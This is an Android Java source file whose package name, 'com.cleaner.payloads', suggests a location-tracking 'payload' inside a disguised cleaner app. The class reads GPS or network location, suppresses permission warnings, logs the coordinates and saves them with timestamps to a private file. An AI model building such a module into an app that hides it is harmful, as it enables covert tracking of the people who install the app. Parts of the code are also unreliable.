package com.cleaner.payloads;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.util.Log;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.Date;
import java.util.Objects;

import androidx.annotation.NonNull;

@SuppressLint("MissingPermission")
public class locationManager implements LocationListener {
    private Context context;
    private Activity activity;
    private LocationManager locationManager;
    private Location location;
    private Double latitude;
    private Double longitude;

    private boolean isGPSEnabled;
    private boolean isNetworkEnabled;

    /**
     * @param context context
     * @param activity can be just created activity
     */
    public locationManager(Context context, Activity activity) {
        this.context = context;
        this.activity = activity;
    }

    public void init() {
        locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }


    /**
     * @return result, latitude and longitude can be used as a result
     * which is not needed when formatting. The method automatically
     * tries to use internet and gps. If the system does not allow the
     * use of gps by the system, then the result will not be.
     */
    public String getLastLocation() {
        String result = "";
        String lat = "";
        String lon = "";

        if (isNetworkEnabled && isGPSEnabled) {
            getGPSLocation(context);

            if (latitude != null && longitude != null) {
                lat = latitude.toString();
                lon = longitude.toString();
                Log.d("GET LAST LOCATION", lat + lon);
            }

        } else if (isGPSEnabled) {
            getGPSLocation(context);

            if (latitude != null && longitude != null) {
                lat = latitude.toString();
                lon = longitude.toString();
                Log.d("GET LAST LOCATION", lat + lon);
            }

        } else if (isNetworkEnabled) {
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getNetworkLocation(context);
                }
            });

            if (latitude != null && longitude != null) {
                lat = latitude.toString();
                lon = longitude.toString();
                Log.d("GET LAST LOCATION", lat + lon);
            }
        }

        if (!lat.isEmpty() && !lon.isEmpty()) {
            result = lat + "- latitude | longitude - " + lon;
            Log.d("GET LAST LOCATION", result);
            saveLocation(context, result);
        } else {
            Log.d("LOCATION MANAGER", "LATITUDE AND LONGITUDE IS EMPTY");
        }

        return result;
    }


    /**
     * The method that uses the Internet, if there is no
     * connection, there may be a bad result
     */
    private void getNetworkLocation(Context context) {
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 10, this);
        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();
        }
    }

    /**
     * The method is similar to working with an Internet connection
     */
    private void getGPSLocation(Context context) {
        activity.runOnUiThread(() -> locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 10, (LocationListener) context));
        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();
        }
    }

    /**
     * @param coordinates can be any string, will be
     * written to the location.txt file which is not
     * accessible to external user influence
     */
    public void saveLocation(Context context, String coordinates) {
        String fileName = "locations.txt";
        String text = coordinates + " ######## Time: " + getCurrentTime();

        try {
            if (!Objects.equals(text, "")) {
                OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(fileName, Context.MODE_PRIVATE));
                outputStreamWriter.write(text);
                outputStreamWriter.close();
            }
            else {
                Log.d("LOCATION MANAGER", "saveLocation: coordinates is null");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String getCurrentTime() {
        Date date = new Date();
        return  date.toString();
    }

    @Override
    public void onLocationChanged(@NonNull Location location) {

    }
}
